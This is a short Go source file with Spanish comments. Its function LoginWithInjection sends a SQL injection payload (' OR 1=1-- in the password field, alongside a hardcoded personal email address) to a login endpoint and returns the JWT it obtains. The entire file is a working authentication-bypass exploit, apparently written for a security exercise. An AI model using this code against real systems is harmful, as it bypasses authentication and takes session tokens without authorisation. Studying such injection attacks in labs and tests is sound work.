package auth

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
)

// loginRequest modela el body JSON para /login
type loginRequest struct {
	Email    string `json:"email"`
	Password string `json:"password"`
}

// loginResponse modela la respuesta JSON de /login
type loginResponse struct {
	Error interface{} `json:"error"`
	Data  struct {
		Token string `json:"token"`
	} `json:"data"`
}

// LoginWithInjection hace POST a /login usando SQL-Injection y devuelve el JWT real.
func LoginWithInjection(loginURL string) (string, error) {
	// 👉 prueba poniendo la inyección en password, con tu email “real”
	payload := loginRequest{
		Email:    "2felipesuarez2@gmail.com",
		Password: "' OR 1=1-- ",
	}
	b, _ := json.Marshal(payload)

	resp, err := http.Post(loginURL, "application/json", bytes.NewBuffer(b))
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	// ——— Logs de debug ———
	bodyBytes, _ := io.ReadAll(resp.Body)
	fmt.Printf("DEBUG LOGIN status: %d\n", resp.StatusCode)
	fmt.Printf("DEBUG LOGIN body:   %s\n\n", string(bodyBytes))
	// ——————————————————

	var lr loginResponse
	if err := json.Unmarshal(bodyBytes, &lr); err != nil {
		return "", err
	}
	if lr.Error != nil {
		return "", fmt.Errorf("login error: %v", lr.Error)
	}
	return lr.Data.Token, nil
}
